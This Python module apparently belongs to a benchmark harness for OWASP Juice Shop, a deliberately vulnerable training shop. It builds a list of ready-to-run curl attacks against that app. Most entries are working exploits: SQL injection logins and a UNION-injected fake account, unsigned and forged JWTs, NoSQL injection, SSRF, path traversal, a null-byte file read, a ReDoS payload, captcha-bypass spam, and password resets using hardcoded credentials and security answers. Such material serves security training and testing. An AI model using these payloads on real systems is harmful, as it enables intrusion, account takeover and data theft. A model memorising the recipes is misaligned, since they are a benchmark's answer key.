"""F71 — Canary attacks extracted from juice-shop official e2e test suite.

Source: https://github.com/juice-shop/juice-shop/tree/master/test/cypress/e2e
        https://github.com/juice-shop/juice-shop/blob/master/routes/verify.ts

Each entry below mirrors an `cy.expectChallengeSolved({ challenge: 'X' })`
assertion from a Cypress spec, or a `challengeUtils.solveIf(...)` pattern
from `routes/verify.ts`. The HTTP shape comes directly from the same
source file — they are the exact payloads the server accepts to flip
`solved=true`.

These are **ground truth recipes** (the test suite verifies them on
every juice-shop CI run), not writeup heuristics. Each entry cites its
origin.
"""
from __future__ import annotations

from typing import Callable

# Re-exported from juice_shop_bench.
AttackList = list[tuple[str, list[str]]]


def build_f71_attacks(
    base: str,
    login_admin_jwt: Callable[[], str | None],
) -> AttackList:
    """Build F71 attack list. Many recipes do not require auth; a few
    that mutate state use `$(login_admin_jwt())` inline to acquire a
    JWT via the existing SQLi-admin helper from juice_shop_bench.

    All curl commands are suppressed via >/dev/null to keep the bench
    output tidy; the bench itself verifies success by re-polling
    /api/Challenges.
    """
    def cauth() -> str:
        """Render a shell snippet that prepends `Authorization: Bearer <tok>`
        by calling the admin-login SQLi endpoint inline. The bench's
        login_admin_jwt() Python cache is NOT reachable from the shell,
        so each call re-SQLi-logins. One extra request per authed attack."""
        return (
            "T=$(curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"x\"}' "
            f"{base}/rest/user/login | python3 -c 'import sys,json;"
            "print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))') "
        )

    return [
        # ============================================================
        # GROUP 1 — Canary PNG + static-file triggers (routes/verify.ts L63-72)
        # ONE GET each, NO auth required. Eight challenges in eight curls.
        # ============================================================
        ("f71_score_board_canary_png", [
            # verify.ts L63: solveIf endsWith(url, '/1px.png')
            f"curl -s {base}/assets/public/images/padding/1px.png >/dev/null",
        ]),
        ("f71_web3_sandbox_canary_png", [
            # verify.ts L64: solveIf endsWith(url, '/11px.png')
            f"curl -s {base}/assets/public/images/padding/11px.png >/dev/null",
        ]),
        ("f71_admin_section_canary_png", [
            # verify.ts L65: solveIf endsWith(url, '/19px.png')
            f"curl -s {base}/assets/public/images/padding/19px.png >/dev/null",
        ]),
        ("f71_token_sale_canary_png", [
            # verify.ts L66: solveIf endsWith(url, '/56px.png')
            f"curl -s {base}/assets/public/images/padding/56px.png >/dev/null",
        ]),
        ("f71_privacy_policy_canary_png", [
            # verify.ts L67: solveIf endsWith(url, '/81px.png')
            f"curl -s {base}/assets/public/images/padding/81px.png >/dev/null",
        ]),
        ("f71_extra_language_klingon", [
            # verify.ts L68 + directAccess.spec.ts "extraLanguage"
            f"curl -s {base}/assets/i18n/tlh_AA.json >/dev/null",
        ]),
        ("f71_security_policy_file", [
            # verify.ts L70 + directAccess.spec.ts "securityPolicy"
            f"curl -s {base}/.well-known/security.txt >/dev/null",
        ]),
        ("f71_missing_encoding_cat_photo", [
            # verify.ts L71 + directAccess.spec.ts "missingEncoding"
            f"curl -s '{base}/assets/public/images/uploads/"
            "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg' "
            ">/dev/null",
        ]),
        ("f71_access_log_today", [
            # verify.ts L72: match(/access\\.log(0-9-)*/)
            # directAccess.spec.ts "accessLogDisclosure"
            f"D=$(date -u +%Y-%m-%d); curl -s '{base}/support/logs/access.log.$D' >/dev/null",
        ]),

        # ============================================================
        # GROUP 2 — Feedback keyword sprayer (verify.ts L238-290).
        # A single POST with ALL markers in one `comment` triggers 7-8
        # challenges via the `Op.like '%marker%'` background scanner.
        # Requires captcha resolve first.
        # ============================================================
        ("f71_feedback_keyword_sprayer", [
            # Solves in one shot: weirdCrypto, typosquattingNpm,
            # typosquattingAngular, hiddenImage, supplyChainAttack,
            # leakedApiKey, knownVulnerableComponent.
            # Source: routes/verify.ts L238-320; contact.spec.ts.
            # Two POSTs in case the first captcha expires between calls.
            (
                f"CAP=$(curl -s {base}/rest/captcha/); "
                "CID=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"captchaId\"])'); "
                "CAN=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"answer\"])'); "
                "curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"captchaId\":'$CID',\"captcha\":\"'$CAN'\",\"rating\":3,"
                "\"comment\":\"sanitize-html 1.4.2 and express-jwt 0.1.3 are bad. "
                "Weird crypto: z85 base85 hashids md5 base64. "
                "Typosquatting: epilogue-js ngy-cookie. "
                "Pickle rick is hiding. "
                "Supply chain: https://github.com/eslint-scope/issues/39. "
                "Key: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie\"}' "
                f"{base}/api/Feedbacks >/dev/null"
            ),
        ]),

        # ============================================================
        # GROUP 3 — SQLi login variants — ONE POST per user.
        # Source: login.spec.ts.
        # ============================================================
        ("f71_login_jim_sqli_apostrophe", [
            # login.spec.ts "loginJim": jim@juice-sh.op'-- / a
            f"curl -s -X POST -H 'Content-Type: application/json' "
            f"-d \"{{\\\"email\\\":\\\"jim@juice-sh.op'--\\\",\\\"password\\\":\\\"a\\\"}}\" "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_bender_sqli_apostrophe", [
            # login.spec.ts "loginBender"
            f"curl -s -X POST -H 'Content-Type: application/json' "
            f"-d \"{{\\\"email\\\":\\\"bender@juice-sh.op'--\\\",\\\"password\\\":\\\"a\\\"}}\" "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_amy_exact_password", [
            # login.spec.ts "loginAmy"
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"amy@juice-sh.op\",\"password\":\"K1f.....................\"}' "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_support_team", [
            # login.spec.ts "loginSupport"
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"support@juice-sh.op\","
            "\"password\":\"J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P\"}' "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_dlp_jannik", [
            # login.spec.ts "dlpPasswordSpraying" → Leaked Access Logs
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"J12934@juice-sh.op\","
            "\"password\":\"0Y8rMnww$*9VFYE\\u00a759-!Fg1L6t&6lB\"}' "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_ghost_chris_pike", [
            # login.spec.ts "ghostLogin" → /login.spec.ts "Ephemeral Accountant"
            # pattern. chris.pike is the soft-deleted user.
            f"curl -s -X POST -H 'Content-Type: application/json' "
            f"-d \"{{\\\"email\\\":\\\"chris.pike@juice-sh.op'--\\\",\\\"password\\\":\\\"a\\\"}}\" "
            f"{base}/rest/user/login >/dev/null",
        ]),
        ("f71_login_ephemeral_accountant_union", [
            # Ephemeral Accountant — classic UNION creates a virtual user.
            # From test/api/loginApiSpec.ts. Writes JSON via heredoc so we
            # don't have to fight 4-layer shell/Python escape interaction.
            (
                "cat > /tmp/eph.json <<'JSONEOF'\n"
                "{\"email\":\"' UNION SELECT * FROM (SELECT 15 as id, '' as username, "
                "'acc0unt4nt@juice-sh.op' as email, '12345' as password, "
                "'accounting' as role, '123' as deluxeToken, '1.2.3.4' as lastLoginIp, "
                "'/assets/public/images/uploads/default.svg' as profileImage, "
                "'' as totpSecret, 1 as isActive, '1999-08-16 14:14:41.644 +00:00' as createdAt, "
                "'1999-08-16 14:33:41.930 +00:00' as updatedAt, null as deletedAt)--\","
                "\"password\":\"x\"}\n"
                "JSONEOF\n"
                f"curl -s -X POST -H 'Content-Type: application/json' "
                f"--data @/tmp/eph.json {base}/rest/user/login >/dev/null"
            ),
        ]),

        # ============================================================
        # GROUP 4 — Reset-password with security answers.
        # Source: forgotPassword.spec.ts.
        # ============================================================
        ("f71_reset_bender_password", [
            # forgotPassword.spec.ts "as Bender"
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"bender@juice-sh.op\","
            "\"answer\":\"Stop\\u0027n\\u0027Drop\","
            "\"new\":\"Brannigan 8=o Leela\",\"repeat\":\"Brannigan 8=o Leela\"}' "
            f"{base}/rest/user/reset-password >/dev/null",
        ]),
        ("f71_reset_bjoern_internal", [
            # forgotPassword.spec.ts "as Bjoern/internal"
            # Note trailing space in new password; the test has it.
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"bjoern@juice-sh.op\",\"answer\":\"West-2082\","
            "\"new\":\"monkey birthday \",\"repeat\":\"monkey birthday \"}' "
            f"{base}/rest/user/reset-password >/dev/null",
        ]),
        ("f71_reset_bjoern_owasp_favorite_pet", [
            # forgotPassword.spec.ts "as Bjoern/OWASP" → Bjoern's Favorite Pet
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\","
            "\"new\":\"kitten lesser pooch\",\"repeat\":\"kitten lesser pooch\"}' "
            f"{base}/rest/user/reset-password >/dev/null",
        ]),

        # ============================================================
        # GROUP 5 — Registration variants (register.spec.ts).
        # ============================================================
        ("f71_register_empty_user", [
            # register.spec.ts "registerEmptyUser"
            f"curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"\",\"password\":\"\",\"passwordRepeat\":\"\"}' "
            f"{base}/api/Users >/dev/null",
        ]),

        # ============================================================
        # GROUP 6 — JWT forgery. Unsigned + forged HS256 (literal tokens).
        # Source: forgedJwt.spec.ts. verify.ts L80-96.
        # ============================================================
        ("f71_jwt_unsigned_jwtn3d", [
            # Literal token from forgedJwt.spec.ts "jwtUnsigned".
            # email claim must match /jwtn3d@/; alg must be 'none'.
            f"curl -s -H \"Authorization: Bearer "
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
            "eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.\" "
            f"{base}/rest/user/whoami >/dev/null",
        ]),
        ("f71_jwt_forged_hs256_rsa_lord", [
            # Literal token from forgedJwt.spec.ts "jwtForged".
            # email claim must match /rsa_lord@/; alg must be 'HS256'
            # and HMAC-signed with the server's RSA public key as secret.
            f"curl -s -H \"Authorization: Bearer "
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
            "eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTgzMDM3NzExfQ."
            "gShXDT5TrE5736mpIbfVDEcQbLfteJaQUG7Z0PH8Xc8\" "
            f"{base}/rest/user/whoami >/dev/null",
        ]),

        # ============================================================
        # GROUP 7 — NoSQL injections (noSql.spec.ts).
        # ============================================================
        ("f71_nosql_manipulation_reviews", [
            # noSql.spec.ts "NoSQL Manipulation" → PATCH with $ne selector.
            # Requires admin auth.
            cauth() + f"&& curl -s -X PATCH -H \"Content-Type: application/json\" "
            "-H \"Authorization: Bearer $T\" "
            "-d '{\"id\":{\"$ne\":-1},\"message\":\"NoSQL Injection!\"}' "
            f"{base}/rest/products/reviews >/dev/null",
        ]),
        ("f71_nosql_exfiltration_track_order", [
            # noSql.spec.ts "NoSQL Exfiltration"
            f"curl -s \"{base}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\" "
            ">/dev/null",
        ]),
        ("f71_nosql_dos_products_sleep", [
            # noSql.spec.ts "NoSQL DoS". Short sleep for bench speed.
            f"curl -s --max-time 4 '{base}/rest/products/sleep(200)/reviews' >/dev/null || true",
        ]),

        # ============================================================
        # GROUP 8 — SSRF / SSTi via server-side-challenges middleware.
        # verify.ts L91-103. Key = 'tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'.
        # Triggers if app.locals.abused_ssrf_bug is set → we need to
        # first hit the profile-image-url endpoint pointing back at
        # /solve/challenges/server-side?key=... (internal redirect).
        # Source: profile.spec.ts "ssrf".
        # ============================================================
        ("f71_ssrf_via_profile_image", [
            # Step 1: Trigger the SSRF by sending profile-image URL with
            # the magic key. The server fetches it → sets abused_ssrf_bug.
            # Step 2: Hit the endpoint again with the key as query param.
            cauth() + f"&& curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/x-www-form-urlencoded\" "
            f"--data-urlencode \"imageUrl={base}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3\" "
            f"{base}/profile/image/url >/dev/null; "
            "sleep 1; "
            f"curl -s '{base}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3' >/dev/null",
        ]),

        # ============================================================
        # GROUP 9 — Product tampering & reviews (restApi.spec.ts).
        # ============================================================
        ("f71_product_tampering_osaft_put", [
            # restApi.spec.ts "changeProduct". PUT /api/Products/{osaftId}
            # with description containing the config overwriteUrl anchor.
            # The osaft product id varies; default juice-shop seeds it
            # near ids 1..10 with name "O-Saft". We try a range.
            "for PID in 9 10 11 12; do "
            f"curl -s -X PUT -H \"Content-Type: application/json\" "
            "-d '{\"description\":\"<a href=\\\"https://owasp.slack.com\\\" target=\\\"_blank\\\">More...</a>\"}' "
            f"{base}/api/Products/$PID >/dev/null; "
            "done",
        ]),
        ("f71_forged_review_other_user", [
            # noSql.spec.ts "Forged Review" — auth as mc.safesearch,
            # then PATCH a review authored by a different user.
            (
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"mc.safesearch@juice-sh.op\","
                "\"password\":\"Mr. N00dles\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"R=$(curl -s -H \"Authorization: Bearer $T\" {base}/rest/products/1/reviews "
                "| python3 -c 'import sys,json;d=json.load(sys.stdin).get(\"data\",[]);print(d[0].get(\"_id\",\"\") if d else \"\")'); "
                "[ -n \"$R\" ] && "
                f"curl -s -X PATCH -H \"Authorization: Bearer $T\" "
                "-H \"Content-Type: application/json\" "
                "-d '{\"id\":\"'$R'\",\"message\":\"injected\"}' "
                f"{base}/rest/products/reviews >/dev/null"
            ),
        ]),

        # ============================================================
        # GROUP 10 — Basket manipulation (basket.spec.ts).
        # ============================================================
        ("f71_payback_time_negative_qty", [
            # basket.spec.ts "negativeOrder" → Payback Time
            # PUT /api/BasketItems/1 body {quantity:-100000} as admin.
            cauth() + f"&& curl -s -X PUT -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/json\" "
            "-d '{\"quantity\":-100000}' "
            f"{base}/api/BasketItems/1 >/dev/null",
        ]),
        ("f71_view_basket_other_bid", [
            # basket.spec.ts "basketAccessChallenge" → View Basket.
            # The test sets sessionStorage.bid=3 then visits /basket.
            # Server-side: GET /rest/basket/3 with token of user whose bid=1.
            cauth() + f"&& curl -s -H \"Authorization: Bearer $T\" "
            f"{base}/rest/basket/3 >/dev/null",
        ]),
        ("f71_manipulate_basket_duplicate_key", [
            # basket.spec.ts "basketManipulateChallenge" → Manipulate Basket
            # Body has duplicate BasketId key; Express keeps the last.
            cauth() + f"&& curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/json\" "
            "-d '{ \"ProductId\": 14,\"BasketId\":\"1\",\"quantity\":1,\"BasketId\":\"2\" }' "
            f"{base}/api/BasketItems/ >/dev/null",
        ]),

        # ============================================================
        # GROUP 11 — Allowlist / redirect chains (redirect.spec.ts).
        # ============================================================
        ("f71_allowlist_bypass_trick_indexof", [
            # redirect.spec.ts "Allowlist Bypass" — owasp.org? param
            # contains a whitelisted URL so the indexOf check passes.
            f"curl -s '{base}/redirect?to=https://owasp.org?trickIndexOf=https://github.com/juice-shop/juice-shop' "
            ">/dev/null",
        ]),

        # ============================================================
        # GROUP 12 — Password hash leak (passwordHashLeak.spec.ts).
        # Auth as admin, GET /rest/user/whoami with fields param.
        # ============================================================
        ("f71_password_hash_leak_whoami_fields", [
            cauth() + f"&& curl -s -H \"Authorization: Bearer $T\" "
            f"'{base}/rest/user/whoami?fields=id,email,password' >/dev/null",
        ]),

        # ============================================================
        # GROUP 13 — Direct-access paths (directAccess.spec.ts).
        # ============================================================
        ("f71_nested_easter_egg", [
            # directAccess.spec.ts "easterEgg2"
            f"curl -s '{base}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg' >/dev/null",
        ]),
        ("f71_privacy_policy_inspection", [
            # directAccess.spec.ts "privacyPolicyProof"
            f"curl -s '{base}/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility' "
            ">/dev/null",
        ]),
        ("f71_email_leak_whoami_callback", [
            # directAccess.spec.ts "emailLeak"
            f"curl -s '{base}/rest/user/whoami?callback=func' >/dev/null",
        ]),

        # ============================================================
        # GROUP 14 — FTP poison null byte variants (publicFtp.spec.ts).
        # ============================================================
        ("f71_forgotten_sales_backup_coupons", [
            # publicFtp.spec.ts "forgottenBackup" → Forgotten Sales Backup
            f"curl -s '{base}/ftp/coupons_2013.md.bak%2500.md' >/dev/null",
        ]),

        # ============================================================
        # GROUP 15 — Score Board "Imaginary Challenge" continue-code.
        # ============================================================
        ("f71_imaginary_challenge_continue_code", [
            # scoreBoard.spec.ts "continueCode". Applies a specific
            # contcode that solves challenge #99 (imaginary).
            f"curl -s -X PUT -H 'Content-Type: text/plain' "
            f"{base}/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj "
            ">/dev/null",
        ]),

        # ============================================================
        # GROUP 16 — Deluxe Fraud (deluxe.spec.ts).
        # POST /rest/deluxe-membership with empty body — server grants
        # deluxe without payment.
        # ============================================================
        ("f71_deluxe_fraud_no_payment", [
            # deluxe.spec.ts "freeDeluxe" → Deluxe Fraud
            "T=$(curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' "
            f"{base}/rest/user/login "
            "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
            f"curl -s -X POST -H \"Authorization: Bearer $T\" "
            f"{base}/rest/deluxe-membership >/dev/null",
        ]),

        # ============================================================
        # GROUP 17 — Local File Read (dataErasure.spec.ts).
        # POST /dataerasure form-encoded layout=../package.json.
        # ============================================================
        ("f71_local_file_read_dataerasure", [
            # dataErasure.spec.ts "lfr"
            cauth() + f"&& curl -s -X POST -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/x-www-form-urlencoded\" "
            "-H \"Cookie: token=$T\" "
            f"-H \"Origin: {base}/\" "
            "--data 'layout=../package.json' "
            f"{base}/dataerasure >/dev/null",
        ]),

        # ============================================================
        # GROUP 18 — GDPR Data Theft (dataExport.spec.ts).
        # Register twice with the same email as admin → data export
        # leaks admin data.
        # ============================================================
        ("f71_gdpr_data_theft_email_clash", [
            # dataExport.spec.ts — register with admin's email (diff case),
            # then login + data-export.
            (
                "E=admun${RANDOM}@juice-sh.op; "
                "curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"admun123\","
                "\"passwordRepeat\":\"admun123\",\"securityQuestion\":{\"id\":1,\"question\":\"x\"},"
                "\"securityAnswer\":\"admun\"}' "
                f"{base}/api/Users >/dev/null; "
                "T=$(curl -s -X POST -H 'Content-Type: application/json' "
                "-d '{\"email\":\"'$E'\",\"password\":\"admun123\"}' "
                f"{base}/rest/user/login "
                "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
                f"curl -s -H \"Authorization: Bearer $T\" "
                f"'{base}/rest/user/data-export?format=1' >/dev/null"
            ),
        ]),

        # ============================================================
        # GROUP 19 — B2B Order RCE DoS (b2bOrder.spec.ts).
        # Two distinct payloads — one blocked, one successful.
        # ============================================================
        ("f71_b2b_rce_blocked_while_true", [
            # b2bOrder.spec.ts "rce" → Blocked RCE DoS (status 500).
            cauth() + f"&& curl -s --max-time 6 -X POST -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/json\" "
            "-d '{\"orderLinesData\":\"(function dos() { while(true); })()\"}' "
            f"{base}/b2b/v2/orders/ >/dev/null || true",
        ]),
        ("f71_b2b_rce_successful_regex_redos", [
            # b2bOrder.spec.ts "rceOccupy" → Successful RCE DoS (503).
            cauth() + f"&& curl -s --max-time 8 -X POST -H \"Authorization: Bearer $T\" "
            "-H \"Content-Type: application/json\" "
            "-d '{\"orderLinesData\":\"/((a+)+)b/.test(\\\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\\")\"}' "
            f"{base}/b2b/v2/orders/ >/dev/null || true",
        ]),

        # ============================================================
        # GROUP 20 — Captcha bypass (contact.spec.ts). 15 feedbacks < 20s.
        # ============================================================
        ("f71_captcha_bypass_15_feedbacks", [
            # contact.spec.ts "captchaBypass". Fire 15 quick feedbacks.
            (
                "for i in $(seq 1 15); do "
                f"CAP=$(curl -s {base}/rest/captcha/); "
                "CID=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"captchaId\"])' 2>/dev/null); "
                "CAN=$(echo \"$CAP\" | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"answer\"])' 2>/dev/null); "
                "curl -s -X POST -H \"Content-Type: application/json\" "
                "-d '{\"captchaId\":'$CID',\"captcha\":\"'$CAN'\",\"comment\":\"spam '$i'\",\"rating\":3}' "
                f"{base}/api/Feedbacks >/dev/null; "
                "done"
            ),
        ]),

        # ============================================================
        # GROUP 21 — JSON-edge: search with special quote combinations
        # that Juice Shop uses to trigger the SQL error handler.
        # ============================================================
        ("f71_error_handling_forced_parse_err", [
            # publicFtp.spec.ts "errorHandling" — /ftp/easter.egg returns
            # an Express stack trace (visible via HTML #stacktrace span).
            f"curl -s '{base}/ftp/easter.egg' >/dev/null",
        ]),

        # ============================================================
        # GROUP 22 — Change Bender's Password via query params
        # (changePassword.spec.ts).
        # The XSS vector only works in a browser, but the canary
        # trigger itself is a GET /rest/user/change-password?new=...
        # with Bender's JWT — reproducible via curl.
        # ============================================================
        ("f71_change_bender_password_query", [
            # Log in as bender, hit change-password GET without current.
            "T=$(curl -s -X POST -H 'Content-Type: application/json' "
            "-d '{\"email\":\"bender@juice-sh.op\","
            "\"password\":\"OhG0dPlease1nsertLiquor!\"}' "
            f"{base}/rest/user/login "
            "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
            "[ -z \"$T\" ] && T=$(curl -s -X POST -H 'Content-Type: application/json' "
            f"-d \"{{\\\"email\\\":\\\"bender@juice-sh.op'--\\\",\\\"password\\\":\\\"a\\\"}}\" "
            f"{base}/rest/user/login "
            "| python3 -c 'import sys,json;print(json.load(sys.stdin).get(\"authentication\",{}).get(\"token\",\"\"))'); "
            f"curl -s -H \"Authorization: Bearer $T\" "
            f"'{base}/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic' "
            ">/dev/null",
        ]),
    ]
